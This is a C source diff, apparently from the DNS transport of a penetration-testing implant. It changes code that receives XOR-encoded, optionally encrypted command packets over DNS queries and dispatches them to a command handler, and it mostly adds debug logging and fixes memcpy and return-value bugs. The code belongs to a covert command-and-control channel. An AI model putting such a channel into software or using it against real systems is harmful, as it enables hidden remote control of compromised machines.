@@ -66,6 +66,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 			vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
 			tries--;
 			force_next = TRUE;
+            sleep(2);
 			//recieve->status = ERROR_READ_FAULT;
 			continue;
 		}
@@ -183,10 +184,12 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 		{
 			recieve->status = DNS_INFO_NO_RECORDS;
 			recieve->size = 0;
+            vdprintf("[PACKET RECEIVE WINDNS] NO RECORDS");
 		}
 		else {
 			recieve->status = ERROR_SUCCESS;
 			recieve->size = need_to_recieve;
+            vdprintf("[PACKET RECEIVE WINDNS] PACKET READY");
 		}
 	}
 	else{
@@ -198,13 +201,14 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 		vdprintf("[PACKET RECEIVE WINDNS] recv. error");
 		recieve->status = ERROR_READ_FAULT;
 		recieve->size = 0;
+        return FALSE;
 	}
 
 
 
 	vdprintf("[PACKET RECEIVE WINDNS] packet recieved.");
 	
-	return 0;
+	return TRUE;
 }
 
 /*!
@@ -348,8 +352,6 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 			parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
 			parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);
 			rest_len -= parts;
-
-			vdprintf("%d %d %d", rest_len, parts, parts_last);
 
 			DWORD i = 0;
 			DWORD shift2 = current_sent;
@@ -572,26 +574,29 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 			vdprintf("[PACKET RECEIVE DNS] Data recieved: %u bytes", recieved.size);
 			
 			//read header
-			memcpy(&header, &recieved.packet, sizeof(PacketHeader));
+			memcpy(&header, recieved.packet, sizeof(PacketHeader));
 			dprintf("[PACKET RECEIVE DNS] decoding header");
+           
 			header.xor_key = ntohl(header.xor_key);
-			xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);
+            xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);
 			header.length = ntohl(header.length);
+            dprintf("[PACKET RECEIVE DNS] key:0x%x len:0x%x",header.xor_key, header.length);
 			// Initialize the header
-			vdprintf("[PACKET RECEIVE DNS] initialising header");
+			vdprintf("[PACKET RECEIVE DNS] tlv length: %d", header.length);
 			// use TlvHeader size here, because the length doesn't include the xor byte
 			payloadLength = header.length - sizeof(TlvHeader);
-			payloadBytesLeft = payloadLength;
 
 			// Allocate the payload
 			if (!(payload = (PUCHAR)malloc(payloadLength)))
 			{
 				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+                vdprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");
 			
 			} else {
 			
+                dprintf("[PACKET RECEIVE DNS] copy %d",payloadLength);
 				// Read the payload
-				memcpy(payload + sizeof(PacketHeader), recieved.packet, payloadLength);
+				memcpy(payload, recieved.packet + sizeof(header), payloadLength);
 				
 				dprintf("[PACKET RECEIVE DNS] decoding payload");
 				xor_bytes(header.xor_key, payload, payloadLength);
@@ -600,6 +605,7 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 				if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
 				{
 					SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+                    dprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");
 				} else {
 
 					memset(localPacket, 0, sizeof(Packet));
@@ -612,7 +618,7 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 					{
 						ULONG origPayloadLength = payloadLength;
 						PUCHAR origPayload = payload;
-
+                        dprintf("[PACKET RECEIVE DNS] decrypting");
 						// Decrypt
 						if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
 						{
@@ -621,15 +627,20 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 
 						// We no longer need the encrypted payload
 						free(origPayload);
-					}
+					} else 
+                    {
+                        dprintf("[PACKET RECEIVE DNS] plain-text");
+                        res = ERROR_SUCCESS;
+                    }
 					
 					if (res == ERROR_SUCCESS) {
 						localPacket->header.length = header.length;
 						localPacket->header.type = header.type;
 						localPacket->payload = payload;
 						localPacket->payloadLength = payloadLength;
-
+                        
 						*packet = localPacket;
+                        dprintf("[PACKET RECEIVE DNS] got packet: %x %x %x %x",localPacket->header.length, localPacket->header.type, localPacket->payload, localPacket->payloadLength );
 						SetLastError(ERROR_SUCCESS);
 					}
 				}
@@ -809,7 +820,7 @@ static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
 			// Reset the empty count when we receive a packet
 			ecount = 0;
 
-			dprintf("[DISPATCH] Returned result: %d", result);
+			dprintf("[DISPATCH] Returned result: %d, %x", result,packet);
 
 			running = command_handle(remote, packet);
 			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
